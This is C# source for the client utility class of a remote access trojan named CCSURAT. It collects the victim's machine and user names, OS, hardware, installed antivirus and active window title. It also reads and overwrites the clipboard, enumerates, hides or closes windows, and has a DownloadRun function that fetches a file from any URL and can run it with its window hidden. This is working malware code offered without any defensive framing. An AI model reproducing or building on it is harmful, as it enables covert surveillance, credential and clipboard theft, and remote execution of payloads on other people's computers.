using System;
using Microsoft.Win32;
using System.Management;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Net;

namespace CCSURAT_Client
{
    // this class is used to retrieve/store information on the client PC
    // this will also be where info/basic command functions are written.
    static class SystemUtils
    {
        #region SystemInfo
        public static string SystemInfo()
        {
            string info = "";
            info += GetGUID() + "|*|";
            info += Application.ProductVersion + "|*|";
            info += Environment.MachineName + "|*|";
            info += Environment.UserName + "|*|";
            info += GetOS() + "|*|";
            info += GetCPU() + "|*|";
            info += GetRAM() + "|*|";
            info += GetAV() + "|*|";
            info += GetActiveWindow();
            return info;
        }

        // Get OS version from registry, other way would be translating it from Environment class
        public static string GetOS()
        {
            RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            // Detect and append system architecture
            string pa = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            return (string)reg.GetValue("ProductName") + " " + ((String.IsNullOrEmpty(pa) || String.Compare(pa, 0, "x86", 0, 3, true) == 0) ? 32 : 64) + "-bit";
        }

        public static string GetCPU()
        {
            // Can count subkeys to get # of cores.
            RegistryKey reg = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
            return (string)reg.GetValue("ProcessorNameString");
        }

        public static string GetRAM()
        {
            long total = 0;
            // Query WMI
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
            // Get each stick of installed memory
            foreach (ManagementObject mObj in searcher.Get())
            {
                // Convert to GB from Bytes and add to total
                total += Convert.ToInt64(mObj["Capacity"]) / 1024 / 1024 / 1024;
            }
            return total.ToString() + " GB";
        }

        // Attempts to grab AV from WMI, test have shown that this may not work properly. Rework.
        public static string GetAV()
        {
            try
            {
                ManagementObjectSearcher searcher = null;
                searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                foreach (ManagementObject mObj in searcher.Get())
                    return mObj["displayName"].ToString();
            }
            catch (Exception ex)
            {
                return "Not Found";
            }
            return "Not Found";
        }
        #endregion

        // Get/Set clipboard data.
        public static string GetClipboard()
        {
            try {
                IDataObject iData = Clipboard.GetDataObject();
                string clipboardData = Clipboard.GetData(DataFormats.Text).ToString();
                if (clipboardData != string.Empty)
                    return clipboardData;
                else
                    return "[[EMPTY]]";
            } catch(Exception ex)
            {
                return "[[EMPTY]]";
            }
        }
        public static void SetClipboard(string s)
        {
            Clipboard.SetText(s);
        }

        // Downloads and executes file from a URL. File downloads to current client directory.
        public static void DownloadRun(string url, string type)
        {
            try
            {
                WebClient webClient = new WebClient();
                string file = url.Substring(url.LastIndexOf("/") + 1);
                webClient.DownloadFile(url, Environment.CurrentDirectory + "\\" + file);
                Process start = new Process();
                start.StartInfo.FileName = Environment.CurrentDirectory + "\\" + file;
                if (type == "HIDDEN")
                {
                    start.StartInfo.CreateNoWindow = true;
                    start.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                }
                start.Start();
            }
            catch (Exception ex)
            {

            }
        }

        // Gets information about all displays/monitors.
        public static string GetMonitors()
        {
            string monitors = "";
            foreach (var screen in Screen.AllScreens)
            {
                monitors += screen.Primary.ToString() + "|*|";
                monitors += screen.Bounds.X + "|*|";
                monitors += screen.Bounds.Y + "|*|";
                monitors += screen.Bounds.Width + "|*|";
                monitors += screen.Bounds.Height + "|*|";
                monitors += screen.DeviceName + "|&|"; // double asterisk seperates multiple monitors.
            }
            return monitors;
        }

        // Create GUID for client. Use the first 8 characters.
        public static string GetGUID()
        {
            // Client identification
            if (Properties.Settings.Default.ID == string.Empty)
            {
                Properties.Settings.Default.ID = Guid.NewGuid().ToString().Substring(0, 8).ToUpper();
                Properties.Settings.Default.Save();
            }
            return Properties.Settings.Default.ID;
        }

        #region WindowManager
        // Get current active (window in foreground window
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        public static string GetActiveWindow()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);
        // Gets all open windows
        public static string GetWindows()
        {
            try
            {
                string windows = "";
                Process[] processList = Process.GetProcesses();
                IntPtr hWnd;
                // Loop through each process, getting the window handle, title, and executable path.
                foreach (Process p in processList)
                    if ((hWnd = p.MainWindowHandle) != IntPtr.Zero)
                        windows += hWnd.ToString() + "|*|" +
                            (string.IsNullOrEmpty(p.MainWindowTitle) ? "N/A" : p.MainWindowTitle) + "|*|" +
                            GetMainModuleFilepath(p.Id) + "|*|" +
                            (IsWindowVisible(hWnd) ? "Visible" : "Hidden") + "|&|";
                return windows;

            } catch(Exception ex)
            {
                return "[[NONE]]";
            }
        }

        // Gets the process's executable path. Process.MainModule.FileName threw an exception due to denied access.
        private static string GetMainModuleFilepath(int processId)
        {
            try {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT ExecutablePath from Win32_Process where ProcessID = " + processId);

                ManagementObject managementObject = null;
                foreach (ManagementObject obj in searcher.Get())
                {
                    managementObject = obj;
                    break;
                }
                Console.WriteLine("Path: " + managementObject["ExecutablePath"].ToString());
                return managementObject["ExecutablePath"].ToString();
            } catch(Exception ex)
            {
                return "N/A";
            }
        }

        [DllImport("user32.dll")]
        private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
        // Show Window styles
        private const int SW_HIDE = 0;
        private const int SW_SHOWNORMAL = 1;
        private const int SW_SHOWMINIMIZED = 2;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_RESTORE = 9;
        private const int SW_DEFAULT = 10;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_CLOSE = 0xF060;
        public static void ChangeWindowView(string hWnd, string style)
        {
            try
            {
                IntPtr h = new IntPtr(Convert.ToInt64(hWnd));
                switch (style)
                {
                    case "MAXIMIZE":
                        ShowWindowAsync(h, SW_SHOWMAXIMIZED);
                        break;
                    case "MINIMIZE":
                        ShowWindowAsync(h, SW_SHOWMINIMIZED);
                        break;
                    case "RESTORE":
                        ShowWindowAsync(h, SW_SHOWNORMAL);
                        break;
                    case "HIDE":
                        ShowWindowAsync(h, SW_HIDE);
                        break;
                    case "CLOSE":
                        SendMessage(h.ToInt32(), WM_SYSCOMMAND, SC_CLOSE, 0);
                        break;
                }
            }
            catch(Exception ex) { }
        }
        #endregion

        public static void Beep(int f, int d)
        {
            BackgroundBeep.frequency = f;
            BackgroundBeep.duration = d;
            BackgroundBeep.signalBeep.Set();
        }
    }

    // Threadded beeping class
    public class BackgroundBeep
    {
        public static Thread beepThread;
        public static AutoResetEvent signalBeep;
        public static int frequency, duration;

        static BackgroundBeep()
        {
            signalBeep = new AutoResetEvent(false);
            beepThread = new Thread(() =>
            {
                for (;;)
                {
                    signalBeep.WaitOne();
                    Console.Beep(frequency, duration);
                }
            }, 1);
            beepThread.IsBackground = true;
            beepThread.Start();
        }
    }
}
